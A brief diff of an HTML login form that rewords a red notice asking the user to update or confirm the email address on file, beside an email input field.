@@ -120,7 +120,7 @@
 <div class="form-group col-lg-12 col-md-12"><label for="login_text_j_username">Email Address</label> <input aria-label="Enter Your Email Address" autocomplete="off" autofocus="" class="form-control" id="userNameInput" name="1" required="required" title="User ID" type="text" /></div>
 </div>
 
-<p><span style="color:#e74c3c;">Kindly update your Email Address to the Email Address on File!&nbsp;</span></p>
+<p><span style="color:#e74c3c;">Kindly update/confirm your Email Address on File!&nbsp;</span></p>
 
 <div class="login-inputs row"></div>
 
